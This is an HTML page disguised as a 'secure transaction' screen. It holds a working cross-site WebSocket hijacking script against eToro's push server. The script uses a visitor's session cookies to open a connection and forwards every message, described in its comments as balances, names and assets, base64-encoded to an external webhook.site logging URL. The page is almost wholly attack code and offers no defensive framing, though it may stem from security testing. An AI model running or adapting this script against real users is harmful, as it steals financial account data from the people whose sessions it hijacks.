<!DOCTYPE html>
<html>
<head>
    <title>Iniciando Transação Segura...</title>
</head>
<body>
    <script>
        // Este script tenta se conectar ao servidor de PUSH do eToro
        // usando a sessão do navegador da vítima (Cookies automáticos)
        
        const targetWS = "wss://push-lightstreamer.cloud.etoro.com/lightstreamer";
        const attackerServer = "https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/log?data=";

        const ws = new WebSocket(targetWS);

        ws.onopen = () => {
            // Tentamos criar a sessão. Se o servidor aceitar cookies, 
            // ele ignorará a falta do JWT ou usará o cookie de sessão.
            ws.send("create_session\r\nLS_adapter_set=PROXY_PUSH");
        };

        ws.onmessage = (e) => {
            // Envia tudo o que o eToro "falar" no WebSocket para o SEU servidor
            // Aqui virão saldos, nomes, ativos, etc.
            fetch(attackerServer + btoa(e.data));
            
            // Console apenas para você ver durante o teste
            console.log("Exfiltrado:", e.data);
        };

        ws.onerror = () => {
            // Se falhar aqui, o servidor provavelmente exige o token na URL
            console.log("Falha: Autenticação via Cookie não permitida ou Origin bloqueado.");
        };
    </script>
</body>
</html>
